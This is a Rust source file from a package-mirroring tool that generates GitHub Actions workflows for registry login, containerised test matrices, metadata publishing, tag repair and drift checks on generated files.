/// `docker login ghcr.io` succeeds either way — login does not authorise — so a
/// cross-owner target first surfaces as `denied: installation not allowed to
/// Create organization package` in the push job, and the GHCR credential probe
/// is a constant `have=true` with no honest skip branch to take.
///
/// `publishing_repo` is `GITHUB_REPOSITORY` (`owner/repo`). It is set on every
/// runner — the drift guard runs `generate ci --check` there — and absent when a
/// maintainer generates locally, where the owner is simply unknown and the
/// check yields nothing. Warn only: generate cannot always know the remote, and
/// a cross-owner push with a PAT is a legitimate (if unsupported) setup.
fn ghcr_owner_warning(spec: &MirrorSpec, publishing_repo: Option<&str>) -> Option<String> {
    if spec.target.registry != GHCR_REGISTRY {
        return None;
    }
    let publishing_owner = publishing_repo?.split('/').next()?.trim();
    let target_owner = spec.target.repository.split('/').next()?.trim();
    if publishing_owner.is_empty() || target_owner.is_empty() || publishing_owner.eq_ignore_ascii_case(target_owner) {
        return None;
    }
    Some(format!(
        "target {}/{} is owned by `{target_owner}` but this repository belongs to \
         `{publishing_owner}` — GITHUB_TOKEN only authorises packages under its own owner, \
         so the push will fail with `denied: installation not allowed to Create organization \
         package`. Publish under `{publishing_owner}`, or log in with a PAT that can write \
         `{target_owner}` packages.",
        GHCR_REGISTRY, spec.target.repository,
    ))
}

/// Credential-detection + registry-login steps, shared by the push job and the
/// describe job — both write to the target registry with the same credential.
///
/// GHCR is always credentialed: `GITHUB_TOKEN` is present on every run, so the
/// probe is a constant `have=true`. Without that, a GHCR push would take the
/// "no `OCX_MIRROR_REGISTRY_TOKEN`" branch and silently skip on every run.
/// Those org secrets hold `ocx.sh` credentials shared across every mirror
/// repository — repurposing them for GHCR would break all of them — so the
/// GHCR path never reads them.
fn render_registry_auth_steps(spec: &MirrorSpec) -> String {
    if spec.target.registry == GHCR_REGISTRY {
        return format!(
            r#"      # ghcr.io authenticates with this run's own GITHUB_TOKEN, which is
      # always present — so the credential probe is constant. The shared
      # OCX_MIRROR_REGISTRY_* org secrets hold {other} credentials and are
      # deliberately not read here.
      - name: Detect registry credentials
        id: creds
        run: echo "have=true" >> "${{GITHUB_OUTPUT}}"
      # docker login so ocx picks the credential up via its native-credential
      # fallback (`get_docker_auth` in crates/ocx_lib/src/auth.rs).
      - name: Login to {ghcr}
        run: |
          echo "${{{{ secrets.GITHUB_TOKEN }}}}" \
            | docker login {ghcr} \
                -u "${{{{ github.actor }}}}" \
                --password-stdin
"#,
            ghcr = GHCR_REGISTRY,
            other = "ocx.sh",
        );
    }

    format!(
        r#"      # Detect whether registry credentials are configured.
      # GitHub does not allow `secrets.*` in job-level `if:`, so we probe at
      # step level via env-var injection (secret value never echoed to logs).
      - name: Detect registry credentials
        id: creds
        env:
          OCX_MIRROR_REGISTRY_TOKEN: ${{{{ secrets.OCX_MIRROR_REGISTRY_TOKEN }}}}
        run: |
          if [ -n "${{OCX_MIRROR_REGISTRY_TOKEN}}" ]; then
            echo "have=true" >> "${{GITHUB_OUTPUT}}"
          else
            echo "have=false" >> "${{GITHUB_OUTPUT}}"
            echo "::notice::No OCX_MIRROR_REGISTRY_TOKEN secret — registry push skipped (repo runs in test/validation mode)."
          fi
      # Use docker login so ocx picks credentials up via its
      # native-credential fallback (`get_docker_auth` in crates/ocx_lib/src/auth.rs).
      # Env-var auth (`OCX_AUTH_<REG>_USER/_TOKEN`) takes precedence over the
      # docker fallback inside ocx, so do NOT also export those vars here.
      - name: Login to {registry}
        if: ${{{{ steps.creds.outputs.have == 'true' }}}}
        run: |
          echo "${{{{ secrets.OCX_MIRROR_REGISTRY_TOKEN }}}}" \
            | docker login {registry} \
                -u "${{{{ secrets.OCX_MIRROR_REGISTRY_USER }}}}" \
                --password-stdin
"#,
        registry = spec.target.registry,
    )
}

/// Render the YAML matrix `include:` entries for the test job.
///
/// Test commands are inlined as a YAML list so the workflow references them
/// via `${{ matrix.tests }}`. This ensures per-platform test overrides
/// (e.g. `cmake.exe --version` on `windows/amd64`) appear verbatim in the
/// generated YAML, satisfying golden-test assertions.
fn render_matrix_entries(legs: &[MatrixLeg]) -> String {
    let mut out = String::new();
    for leg in legs {
        out.push_str(&format!(
            "          - platform: {}\n            platform_slug: {}\n            runner: {}\n            container_id: {}\n",
            leg.platform, leg.platform_slug, leg.runner, leg.container_id,
        ));
        // Emitted only for container legs, so a native-only workflow keeps the
        // exact key set it had before container mode existed (zero drift for the
        // pinned mirror corpus). The test step reads an absent/empty
        // `container_image` as native mode.
        if !leg.container_image.is_empty() {
            out.push_str(&format!(
                "            container_image: {:?}\n            container_libc: {:?}\n            docker_platform: {:?}\n",
                leg.container_image, leg.container_libc, leg.docker_platform,
            ));
        }
        // Second guarded block, for the same reason: a container leg that
        // declares no `setup:` keeps the exact key set it had before the field
        // existed, so provisioning is opt-in per container, not per leg set.
        if !leg.container_dockerfile.is_empty() {
            // Block scalar `|` — the Dockerfile is multi-line and carries
            // whatever quoting the setup commands do. Body at 14 spaces
            // (matrix entry indent 12 + 2), same shape as `script_inline`.
            let indented = leg
                .container_dockerfile
                .lines()
                .map(|line| format!("              {line}"))
                .collect::<Vec<_>>()
                .join("\n");
            out.push_str(&format!("            container_dockerfile: |\n{indented}\n"));
        }
        out.push_str(&format!("            shell: {}\n", leg.shell));
        // Inline the test entries so they are visible in the generated YAML.
        out.push_str("            tests:\n");
        for test in &leg.tests {
            match &test.kind {
                RenderedTestKind::Command(cmd) => {
                    out.push_str(&format!(
                        "              - name: {}\n                kind: command\n                command: {}\n",
                        test.name, cmd
                    ));
                }
                RenderedTestKind::Script(path) => {
                    out.push_str(&format!(
                        "              - name: {}\n                kind: script\n                script: {}\n",
                        test.name, path
                    ));
                }
                RenderedTestKind::ScriptInline(src) => {
                    // Use YAML block scalar `|` so multi-line Starlark survives.
                    // Each line of the inline source is indented 18 spaces
                    // (matrix entry indent 14 + 4 for block scalar body).
                    let indented = src
                        .lines()
                        .map(|line| format!("                  {line}"))
                        .collect::<Vec<_>>()
                        .join("\n");
                    out.push_str(&format!(
                        "              - name: {}\n                kind: script_inline\n                script_inline: |\n{indented}\n",
                        test.name
                    ));
                }
            }
        }
    }
    out
}

/// The one `ocx` CLI release a generated workflow runs, on every leg.
///
/// Both legs read it: native legs pass it to `setup-ocx` as its `version:`
/// input, container legs download the statically-linked release of the same tag
/// and mount it into the image. Left unpinned, the native legs would float to
/// whatever `ocx` is newest on the day a mirror happens to run while the
/// container legs stayed on this constant — the two halves of one test matrix
/// exercising different binaries.
///
/// Deliberately a renderer constant and not a spec field. Which `ocx` executes
/// the tests is a property of *this renderer* — it has to be able to read the
/// bundles this version writes — so it moves when the renderer moves, via each
/// repository's `ocx.lock`. A per-repo knob would let forty mirrors drift onto
/// forty different test binaries, which is the failure this pin exists to
/// prevent.
///
/// The trailing marker is the Renovate anchor; see `customManagers` in
/// `renovate.json`. Keep the literal on one line or the regex stops matching.
const OCX_CONTAINER_CLI_TAG: &str = "v0.5.6"; // renovate: datasource=github-releases depName=ocx-sh/ocx

/// [`OCX_CONTAINER_CLI_TAG`] as `setup-ocx` spells it: a bare semver, no `v`.
///
/// Derived rather than a second constant so the two spellings cannot drift —
/// Renovate only ever moves the tag.
fn ocx_cli_version() -> &'static str {
    OCX_CONTAINER_CLI_TAG.trim_start_matches('v')
}

/// Render per-test shell commands for the `test` job's run step.
///
/// Each matrix leg runs all its tests for every discovered version. The renderer
/// emits a single shell block that iterates per-version.
///
/// A native leg (empty `container_image`) calls `ocx package test` directly on
/// the runner. A container leg fetches a libc-matched, statically-linked `ocx`
/// release and wraps every `ocx package test` in `docker run <image>` — so the
/// mirrored artifact is actually executed by that image's loader against that
/// image's libc, which is the only way an `os.features` musl/glibc claim can be
/// verified. JS actions keep running on the host's glibc node throughout, which
/// is why this is a per-command wrapper rather than a job-level `container:`.
fn render_test_run_steps(legs: &[MatrixLeg]) -> String {
    if legs.is_empty() {
        return String::new();
    }

    // Emitted only when some leg declares an image, so native-only workflows
    // stay byte-identical to the pre-container renderer. `{OCX_TEST}` is the
    // command prefix: the `ocx_test` wrapper under container mode, plain `ocx`
    // otherwise.
    let has_container = legs.iter().any(|leg| !leg.container_image.is_empty());
    let (container_prelude, ocx_test) = if has_container {
        (
            r#"            # Container legs: fetch a libc-matched static ocx once, then run every
            # `ocx package test` inside `docker run <image>` so the mirrored
            # artifact is executed by that image's loader. Native legs (empty
            # container_image, e.g. the macOS/Windows legs of a mixed spec) call
            # the runner's own ocx unchanged.
            CONTAINER_IMAGE="${{ matrix.container_image }}"
            if [ -n "${CONTAINER_IMAGE}" ]; then
              # `docker_platform` is `platform` minus any `os.features` suffix:
              # docker rejects `linux/amd64+libc.musl` outright, while the matrix
              # label, the `ocx package test --platform` flag and the discover
              # platform set all need the full, unambiguous key.
              case "${{ matrix.docker_platform }}" in
                linux/amd64) OCX_ARCH=x86_64 ;;
                linux/arm64) OCX_ARCH=aarch64 ;;
                *) echo "::error::no static ocx release for container platform ${{ matrix.docker_platform }} (linux/amd64 and linux/arm64 only)"; exit 1 ;;
              esac
              # Container legs run the artifact natively — no qemu is installed,
              # so a leg whose runner is a different architecture cannot execute
              # the image at all. Say that, rather than let docker fail with a
              # bare exec-format error several minutes in.
              RUNNER_ARCH_UNAME="$(uname -m)"
              if [ "${RUNNER_ARCH_UNAME}" != "${OCX_ARCH}" ]; then
                echo "::error::container legs for ${{ matrix.docker_platform }} need a ${OCX_ARCH} runner (this one is ${RUNNER_ARCH_UNAME}); set an arch-matched \`runner:\` on this platform"
                exit 1
              fi
              OCX_TRIPLE="${OCX_ARCH}-unknown-linux-${{ matrix.container_libc }}"
              OCX_CONTAINER_DIR="${RUNNER_TEMP}/ocx-${OCX_TRIPLE}"
              OCX_CONTAINER_BIN="${OCX_CONTAINER_DIR}/ocx"
              if [ ! -x "${OCX_CONTAINER_BIN}" ]; then
                mkdir -p "${OCX_CONTAINER_DIR}"
                # cargo-dist archives carry a single top-level directory, so
                # --strip-components=1 lands the binary directly. A layout change
                # fails the chmod instead of silently testing nothing.
                curl -fsSL "https://github.com/ocx-sh/ocx/releases/download/{OCX_CLI_TAG}/ocx-${OCX_TRIPLE}.tar.gz" \
                  | tar -xz -C "${OCX_CONTAINER_DIR}" --strip-components=1
                chmod +x "${OCX_CONTAINER_BIN}"
              fi
              # Pull the image here rather than letting `docker run` do it
              # implicitly: a rate-limited or flaky pull inside the test loop is
              # recorded as a failed testcase, indistinguishable from a mirrored
              # artifact that genuinely does not run. Failing this step instead
              # keeps a red testcase meaning exactly one thing. Guarded by
              # `inspect` — that is when `docker run` would have pulled anyway,
              # and a pull per version would spend a manifest request (the thing
              # being rate-limited) on every one. It also precedes the setup
              # build below, so a provisioned image's FROM resolves from cache.
              if ! docker image inspect "${CONTAINER_IMAGE}" >/dev/null 2>&1; then
                OCX_PULL_ATTEMPT=1
                OCX_PULL_DELAY=2
                until docker pull --platform "${{ matrix.docker_platform }}" "${CONTAINER_IMAGE}"; do
                  if [ "${OCX_PULL_ATTEMPT}" -ge 5 ]; then
                    echo "::error::could not pull ${CONTAINER_IMAGE} for ${{ matrix.docker_platform }} after ${OCX_PULL_ATTEMPT} attempts (rate limit, network, or a tag with no ${{ matrix.docker_platform }} variant — see the docker output above)"
                    exit 1
                  fi
                  echo "pull of ${CONTAINER_IMAGE} failed (attempt ${OCX_PULL_ATTEMPT}); retrying in ${OCX_PULL_DELAY}s"
                  sleep "${OCX_PULL_DELAY}"
                  OCX_PULL_ATTEMPT=$((OCX_PULL_ATTEMPT + 1))
                  OCX_PULL_DELAY=$((OCX_PULL_DELAY * 2))
                done
              fi
{CONTAINER_SETUP_BUILD}            fi
            ocx_test() {
              if [ -n "${CONTAINER_IMAGE}" ]; then
                # The workspace is mounted at its own path so the bundle and its
                # `-metadata.json` sibling resolve identically inside and out.
                # OCX_HOME points into the container's own /tmp, so the install
                # the test runs against never touches the runner's filesystem.
                # The gnu ocx verifies TLS against the system CA store, which a
                # minimal base image need not carry; the musl build has webpki
                # roots baked in and ignores the mount.
                docker run --rm -i --platform "${{ matrix.docker_platform }}" \
                  -v "${GITHUB_WORKSPACE}:${GITHUB_WORKSPACE}" -w "${GITHUB_WORKSPACE}" \
                  -v "${OCX_CONTAINER_BIN}:/usr/local/bin/ocx:ro" \
                  -v /etc/ssl/certs/ca-certificates.crt:/etc/ssl/certs/ca-certificates.crt:ro \
                  -e OCX_HOME=/tmp/ocx-home -e OCX_NO_UPDATE_CHECK=1 \
                  "${CONTAINER_IMAGE}" ocx "$@"
              else
                ocx "$@"
              fi
            }
"#,
            "ocx_test",
        )
    } else {
        ("", "ocx")
    };

    // Provisioning sits inside the container branch, after the arch guard, so
    // an arm64-on-amd64 leg still gets its own diagnosis rather than a docker
    // exec-format error. The `inspect` guard makes the build once-per-leg: the
    // second and every later version of the run finds the tag already there.
    //
    // ponytail: the tag is runner-local and `(container_id, platform_slug)` is
    // unique per leg, which is enough even on a shared self-hosted runner. A
    // pathological `id:` can push it past docker's 128-char tag cap — that
    // fails the build loudly, upgrade to a hash if a real spec ever hits it.
    let container_setup_build = if any_container_setup(legs) {
        r#"              if [ -n "${OCX_CONTAINER_DOCKERFILE:-}" ]; then
                OCX_SETUP_TAG="ocx-mirror-setup:${{ matrix.container_id }}-${{ matrix.platform_slug }}"
                if ! docker image inspect "${OCX_SETUP_TAG}" >/dev/null 2>&1; then
                  printf '%s' "${OCX_CONTAINER_DOCKERFILE}" \
                    | docker build --platform "${{ matrix.docker_platform }}" -t "${OCX_SETUP_TAG}" - \
                    || { echo "::error::container setup failed for ${{ matrix.container_id }} on ${{ matrix.platform }}: a setup: command exited non-zero (the failing RUN is above)"; exit 1; }
                fi
                CONTAINER_IMAGE="${OCX_SETUP_TAG}"
              fi
"#
    } else {
        ""
    };

    let body = r#"{CONTAINER_PRELUDE}            METADATA_SIBLING="${BUNDLE%.tar.xz}-metadata.json"
            mkdir -p junit
            JUNIT_FILE="junit/junit-${VERSION}-${{ matrix.platform_slug }}-${{ matrix.container_id }}.xml"
            TESTS_JSON='${{ toJson(matrix.tests) }}'
            TEST_COUNT=$(echo "${TESTS_JSON}" | jq 'length')
            FAILURES=0
            CASES=""
            for i in $(seq 0 $((TEST_COUNT - 1))); do
              TEST_NAME=$(echo "${TESTS_JSON}" | jq -r ".[$i].name")
              TEST_KIND=$(echo "${TESTS_JSON}" | jq -r ".[$i].kind")
              START=$(date +%s)
              RC=0
              if [ "${TEST_KIND}" = "command" ]; then
                TEST_CMD=$(echo "${TESTS_JSON}" | jq -r ".[$i].command")
                {OCX_TEST} package test --platform "${{ matrix.platform }}" --identifier "{TARGET_IDENTIFIER}:${VERSION}" "${BUNDLE}" -- \
                  ${{ matrix.shell }} -c "${TEST_CMD}" || RC=$?
              elif [ "${TEST_KIND}" = "script" ]; then
                TEST_SCRIPT=$(echo "${TESTS_JSON}" | jq -r ".[$i].script")
                {OCX_TEST} package test --platform "${{ matrix.platform }}" --identifier "{TARGET_IDENTIFIER}:${VERSION}" "${BUNDLE}" \
                  --script "${TEST_SCRIPT}" || RC=$?
              else
                TEST_INLINE=$(echo "${TESTS_JSON}" | jq -r ".[$i].script_inline")
                printf '%s' "${TEST_INLINE}" | {OCX_TEST} package test --platform "${{ matrix.platform }}" --identifier "{TARGET_IDENTIFIER}:${VERSION}" "${BUNDLE}" \
                  --script - || RC=$?
              fi
              END=$(date +%s)
              DUR=$((END - START))
              if [ "${RC}" -eq 0 ]; then
                CASES="${CASES}    <testcase name=\"${TEST_NAME}\" classname=\"${VERSION}.${{ matrix.platform_slug }}.${{ matrix.container_id }}\" time=\"${DUR}\"/>\n"
              else
                CASES="${CASES}    <testcase name=\"${TEST_NAME}\" classname=\"${VERSION}.${{ matrix.platform_slug }}.${{ matrix.container_id }}\" time=\"${DUR}\"><failure type=\"NonZeroExit\" message=\"exit ${RC}\"/></testcase>\n"
                FAILURES=$((FAILURES + 1))
              fi
            done
            {
              echo '<?xml version="1.0" encoding="UTF-8"?>'
              echo "<testsuites>"
              echo "  <testsuite name=\"${VERSION}.${{ matrix.platform_slug }}.${{ matrix.container_id }}\" tests=\"${TEST_COUNT}\" failures=\"${FAILURES}\">"
              if [ -n "${CI_JOB_URL:-}" ]; then
                echo "    <properties>"
                echo "      <property name=\"ci.job.url\" value=\"${CI_JOB_URL}\"/>"
                echo "    </properties>"
              fi
              printf '%b' "${CASES}"
              echo "  </testsuite>"
              echo "</testsuites>"
            } > "${JUNIT_FILE}"
            echo "wrote ${JUNIT_FILE} (tests=${TEST_COUNT}, failures=${FAILURES})"
            if [ "${FAILURES}" -gt 0 ]; then
              exit 1
            fi
"#;
    body.replace("{CONTAINER_PRELUDE}", container_prelude)
        // After `{CONTAINER_PRELUDE}` — the placeholder lives inside it.
        .replace("{CONTAINER_SETUP_BUILD}", container_setup_build)
        .replace("{OCX_TEST}", ocx_test)
}

/// Render the describe.yml catalog-publish workflow.
///
/// Lighter than `mirror.yml`: only the auth + target-registry placeholders need
/// substitution. The workflow itself triggers on changes to `CATALOG.md`,
/// `logo.*`, or `mirror.yml` and invokes
/// `ocx-mirror package pipeline describe` to publish the README + logo to the
/// `__ocx.desc` referrer tag on the target repository.
fn render_describe(spec: &MirrorSpec, slot: &SpecSlot) -> String {
    let triggers = trigger_paths(
        slot,
        &["CATALOG.md".to_string(), "logo.*".to_string(), slot.source()],
        "describe",
    );

    DESCRIBE_TEMPLATE
        .replace("{OCX_MIRROR_VERSION}", VERSION)
        .replace("{OCX_MIRROR_REV}", GIT_SHA_SHORT)
        .replace("{SPEC_SOURCE}", &slot.source())
        .replace("{SPEC_ARG}", &slot.spec_arg())
        .replace("{WORKFLOW_SUFFIX}", &slot.suffix())
        .replace("{TRIGGER_PATHS}", &triggers)
        .replace("{DESCRIBE_PERMISSIONS}", render_registry_write_permissions(spec))
        .replace("{REGISTRY_AUTH_STEPS}", &render_registry_auth_steps(spec))
        .replace("{TARGET_REGISTRY}", &spec.target.registry)
        .replace("{OCX_CLI_VERSION}", ocx_cli_version())
}

/// Render the `announce-from-registry.yml` catch-up workflow.
///
/// Same placeholder set as `describe.yml` — auth steps plus a GHCR permissions
/// block. Dispatch is always available and defaults to reporting: the push job
/// already announces what each run publishes, and this one exists for the
/// backlog a mirror that opted into `announce:` late can never reach by running
/// forward. `announce: { schedule: … }` adds a `schedule:` trigger whose runs
/// announce for real; a run that finds nothing new commits nothing, and opens a
/// pull request only for commits an earlier run stranded on the announce branch
/// (see `AnnounceReport` in `pipeline/push.rs`).
///
/// Keeps a concurrency group of its own rather than joining the push workflow's
/// the way `cascade.yml` does — see the template's comment on the group.
///
/// Takes **discover's** read-only permissions, not describe's. This job only
/// lists the target's tags and fetches their manifests — the writes it performs
/// all land on the index repository, through `OCX_ANNOUNCE_TOKEN`, never through
/// the job's own `GITHUB_TOKEN`. Handing it `packages: write` would grant the
/// one scope that could overwrite the very artifacts it exists to describe.
fn render_announce_from_registry(spec: &MirrorSpec, slot: &SpecSlot) -> String {
    ANNOUNCE_FROM_REGISTRY_TEMPLATE
        .replace("{OCX_MIRROR_VERSION}", VERSION)
        .replace("{OCX_MIRROR_REV}", GIT_SHA_SHORT)
        .replace("{SPEC_SOURCE}", &slot.source())
        .replace("{SPEC_ARG}", &slot.spec_arg())
        .replace("{WORKFLOW_SUFFIX}", &slot.suffix())
        .replace(
            "{ANNOUNCE_SCHEDULE_BLOCK}",
            &schedule_block(spec.announce.as_ref().and_then(|a| a.schedule.as_ref())),
        )
        .replace("{ANNOUNCE_PERMISSIONS}", render_discover_permissions(spec))
        .replace("{REGISTRY_AUTH_STEPS}", &render_registry_auth_steps(spec))
        .replace("{OCX_CLI_VERSION}", ocx_cli_version())
}

/// Render the `patch.yml` metadata-correction workflow.
///
/// Dispatch-only, and deliberately not wired to `pipeline plan`'s `has_drift`
/// output: a drift finding says the published metadata no longer matches the
/// spec, and whether that is worth re-emitting every affected manifest is a
/// maintainer's call. The point of generating it at all is that patching
/// otherwise needs registry push credentials and an index token on somebody's
/// laptop, which is not how any other pipeline verb is run.
///
/// The three `workflow_dispatch` inputs are the command's whole selection
/// surface; the run step turns each present one into its flag and each absent
/// one into nothing, so an empty dispatch patches every published version.
///
/// Takes the same `packages: write` block describe does — this job re-emits
/// manifests on the target repository. The announce it chains into writes to
/// the index repository with `OCX_ANNOUNCE_TOKEN`.
fn render_patch(spec: &MirrorSpec, slot: &SpecSlot) -> String {
    PATCH_TEMPLATE
        .replace("{OCX_MIRROR_VERSION}", VERSION)
        .replace("{OCX_MIRROR_REV}", GIT_SHA_SHORT)
        .replace("{SPEC_SOURCE}", &slot.source())
        .replace("{SPEC_ARG}", &slot.spec_arg())
        .replace("{WORKFLOW_SUFFIX}", &slot.suffix())
        .replace("{PATCH_PERMISSIONS}", render_registry_write_permissions(spec))
        .replace("{REGISTRY_AUTH_STEPS}", &render_registry_auth_steps(spec))
        .replace("{OCX_CLI_VERSION}", ocx_cli_version())
}

/// The workflow-level `concurrency:` group of *this spec's* push workflow.
///
/// `workflow.yml` spells it `mirror-${{ github.workflow }}-publish`, and
/// `github.workflow` is that workflow's `name:` — which the renderer sets to
/// `spec.name`. Resolving it here lets another workflow name the same group
/// without a runtime handle on the push workflow.
fn publish_concurrency_group(spec: &MirrorSpec) -> String {
    format!("mirror-{}-publish", spec.name)
}

/// A workflow's `schedule:` trigger, or nothing.
///
/// The templates place the placeholder on the line above `workflow_dispatch:`,
/// so an absent cron collapses to no lines at all.
///
/// The cron lands inside a single-quoted scalar unescaped; what keeps a spec
/// from closing it and appending triggers of its own is `spec::validate_cron`,
/// which every caller's spec passes through before any file is written.
fn schedule_block(cron: Option<&String>) -> String {
    cron.map(|cron| format!("  schedule:\n    - cron: '{}'\n", cron))
        .unwrap_or_default()
}

/// Render the `cascade.yml` rolling-tag repair workflow.
///
/// Dispatch is always available and defaults to `dry_run: true`, so a repair
/// that nobody asked for in writing only audits. `cascade: { schedule: … }`
/// adds a `schedule:` trigger whose runs repair for real. Emitted only for a
/// spec that cascades — a mirror publishing no rolling alias has no graph to
/// repair.
///
/// Shares the push workflow's concurrency group (see
/// [`publish_concurrency_group`]) so a repair never runs while a publish is
/// mid-way through writing the same aliases. GitHub holds one pending run per
/// group, so the trade is that a run *waiting* in that group — a repair or a
/// publish — is cancelled when a newer run of either workflow queues.
///
/// Takes the same `packages: write` block describe and patch do: a repair
/// writes tags to the target repository. The announce it chains into writes to
/// the index repository with `OCX_ANNOUNCE_TOKEN`.
fn render_cascade(spec: &MirrorSpec, slot: &SpecSlot) -> String {
    CASCADE_TEMPLATE
        .replace("{OCX_MIRROR_VERSION}", VERSION)
        .replace("{OCX_MIRROR_REV}", GIT_SHA_SHORT)
        .replace("{SPEC_SOURCE}", &slot.source())
        .replace("{SPEC_ARG}", &slot.spec_arg())
        .replace("{WORKFLOW_SUFFIX}", &slot.suffix())
        .replace(
            "{CASCADE_SCHEDULE_BLOCK}",
            &schedule_block(spec.cascade.schedule.as_ref()),
        )
        .replace("{PUSH_CONCURRENCY_GROUP}", &publish_concurrency_group(spec))
        .replace("{CASCADE_PERMISSIONS}", render_registry_write_permissions(spec))
        .replace("{REGISTRY_AUTH_STEPS}", &render_registry_auth_steps(spec))
        .replace("{OCX_CLI_VERSION}", ocx_cli_version())
}

/// The `--spec` arguments the drift guard re-renders the repository with.
///
/// Empty for the lone repo-root `mirror.yml`, whose path is what `--spec`
/// already defaults to — that is what keeps every published mirror's committed
/// guard byte-identical. As soon as the repository holds a spec the default
/// cannot name, *every* spec is listed: `--spec` appends, so naming one would
/// silently drop the rest and the guard would check a subset while looking green.
fn verify_spec_args(slots: &[&SpecSlot]) -> String {
    if slots.iter().all(|slot| slot.is_default()) {
        return String::new();
    }
    slots.iter().map(|slot| format!(" --spec {}", slot.source())).collect()
}

/// Render the `verify-generated.yml` drift-guard workflow.
///
/// The workflow runs `ocx-mirror package pipeline generate ci --check` on pull requests
/// and pushes, so a hand-edit to any generated workflow fails CI. Exactly one is
/// emitted per repository — it names every spec, and its path triggers are the
/// union of theirs, which makes the committed file the record of what the
/// repository mirrors. Emitted unless *every* spec opts out via
/// `allow_manual_edits` (see [`render`]).
fn render_verify_generated(slots: &[&SpecSlot]) -> String {
    let mut entries = Vec::new();
    for slot in slots {
        match slot.dir() {
            None => entries.extend([
                slot.source(),
                "scripts/**".to_string(),
                "tests/**".to_string(),
                "metadata*.json".to_string(),
            ]),
            Some(dir) => entries.push(format!("{}/**", slash_path(dir))),
        }
        entries.extend(slot.extends_entries());
    }
    entries.push(".github/workflows/**".to_string());
    // Siblings share one base, so the same path arrives once per child. Keep the
    // first occurrence: order carries which spec brought an entry in.
    let mut seen = std::collections::HashSet::new();
    entries.retain(|entry| seen.insert(entry.clone()));

    let sources = slots.iter().map(|slot| slot.source()).collect::<Vec<_>>().join(", ");

    VERIFY_GENERATED_TEMPLATE
        .replace("{OCX_MIRROR_VERSION}", VERSION)
        .replace("{OCX_MIRROR_REV}", GIT_SHA_SHORT)
        .replace("{SPEC_SOURCE}", &sources)
        .replace("{SPEC_ARGS}", &verify_spec_args(slots))
        .replace("{TRIGGER_PATHS}", &indent_entries(&entries))
        .replace("{OCX_CLI_VERSION}", ocx_cli_version())
}

/// Build the map of repo-root-relative path → file content for one spec.
fn render_spec(spec: &MirrorSpec, slot: &SpecSlot) -> BTreeMap<PathBuf, String> {
    let mut files: BTreeMap<PathBuf, String> = BTreeMap::new();

    files.insert(slot.workflow("mirror"), render_workflow(spec, slot));
    files.insert(slot.workflow("describe"), render_describe(spec, slot));
    // Emitted for every spec, with no opt-in: any published mirror can have its
    // metadata drift, and a repository only discovers it needs the workflow at
    // the moment it already needs to have dispatched it.
    files.insert(slot.workflow("patch"), render_patch(spec, slot));

    // Rolling-tag repair: only a spec that cascades has aliases to break.
    if spec.cascade.enabled {
        files.insert(slot.workflow("cascade"), render_cascade(spec, slot));
    }

    // Index catch-up workflow: only a mirror that announces has an index entry
    // to catch up. Emitted for every such mirror — there is no separate opt-in,
    // because a mirror that opted into `announce:` after publishing is exactly
    // the one that needs it, and it cannot know that about itself.
    if spec.announce.is_some() {
        files.insert(
            slot.workflow("announce-from-registry"),
            render_announce_from_registry(spec, slot),
        );
    }

    files
}

/// Build the full map of relative path → file content for every generated file.
///
/// Keys are relative to the repository root. Every spec contributes its own
/// workflow set; the repository contributes one drift guard, skipped only when
/// *all* specs opt out via `allow_manual_edits` (discouraged) — a single guard
/// covers every workflow, so one spec still wanting it is enough to emit it.
fn render(placed: &[(SpecSlot, MirrorSpec)]) -> BTreeMap<PathBuf, String> {
    let mut files: BTreeMap<PathBuf, String> = BTreeMap::new();
    for (slot, spec) in placed {
        files.extend(render_spec(spec, slot));
    }

    if placed.iter().any(|(_, spec)| !spec.allow_manual_edits) {
        let slots: Vec<&SpecSlot> = placed.iter().map(|(slot, _)| slot).collect();
        files.insert(
            PathBuf::from(".github/workflows/verify-generated.yml"),
            render_verify_generated(&slots),
        );
    }

    files
}

// ── Writer ────────────────────────────────────────────────────────────────────

/// Write all rendered files to disk under `repo_root`.
///
/// Creates parent directories as needed. Uses `tokio::fs::write` which is
/// atomic from the caller's perspective (single write call per file).
async fn write_files(files: &BTreeMap<PathBuf, String>, repo_root: &Path) -> Result<(), MirrorError> {
    for (relative_path, content) in files {
        let dest = repo_root.join(relative_path);
        if let Some(parent) = dest.parent() {
            tokio::fs::create_dir_all(parent).await.map_err(|e| {
                MirrorError::TemplateError(format!("failed to create directory {}: {e}", parent.display()))
            })?;
        }
        tokio::fs::write(&dest, content)
            .await
            .map_err(|e| MirrorError::TemplateError(format!("failed to write {}: {e}", dest.display())))?;
    }
    Ok(())
}

// ── Drift detector ────────────────────────────────────────────────────────────

/// Matches a `uses:` action-reference line so its *pin* can be normalized away
/// before drift comparison. Group `keep` holds the `uses: owner/action` head; the
/// `@<ref>` is matched only when `<ref>` is **pin-shaped** — a single run of
/// non-space, non-`#` characters (a digest or tag) optionally followed by a
/// `# vX` version comment — and that suffix is dropped. A `uses:` line carrying
/// anything else after the ref (shell metacharacters, a second token, inline
/// `with:`-like text) does NOT match, so such a hand-edit still trips drift
/// rather than being masked. Per-line anchored (`(?m)`); matches both `- uses:`
/// list items and bare `uses:` step keys.
///
/// The regex is line-oriented and YAML-unaware: it would also match an indented
/// `uses: owner/action@<ref>` line *inside* a `run:` block scalar. No current
/// template emits such a line — keep it that way (do not emit `run:` block lines
/// beginning with `uses: …@…`) or the pin on that script line would be masked.
static USES_REF_RE: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
    regex::Regex::new(r"(?m)^(?P<keep>[ \t]*(?:-[ \t]+)?uses:[ \t]*[^@\s]+)@[^\s#]+(?:[ \t]*#[^\n]*)?$").unwrap()
});

/// Canonicalize a generated workflow for drift comparison.
///
/// Mirror repositories own the *pin* on every `uses:` action reference: their
/// own Renovate/Dependabot may bump `uses: owner/action@<ref>  # vX` and the
/// drift guard must not treat that as a hand-edit. The guard still polices the
/// workflow *logic* and *which* action each step runs — only the `@<ref>` suffix
/// (digest or tag, plus any trailing version comment) is stripped; the
/// `owner/action` identity is preserved, so swapping in a different action still
/// trips drift. The baked template ships a known-good seed pin for first render.
fn normalize_for_drift(content: &str) -> std::borrow::Cow<'_, str> {
    USES_REF_RE.replace_all(content, "${keep}")
}

/// First line of every file this renderer writes.
const GENERATED_HEADER: &str = "# Generated by ocx-mirror";

/// Generated workflows on disk that the current spec set no longer renders.
///
/// Dropping a spec leaves its workflows behind, and a mirror workflow whose
/// spec no longer exists keeps running on schedule against a spec that is gone.
/// Only files carrying the generated header are considered, so a repository's
/// hand-written workflows are never touched.
async fn stale_generated(files: &BTreeMap<PathBuf, String>, repo_root: &Path) -> Vec<String> {
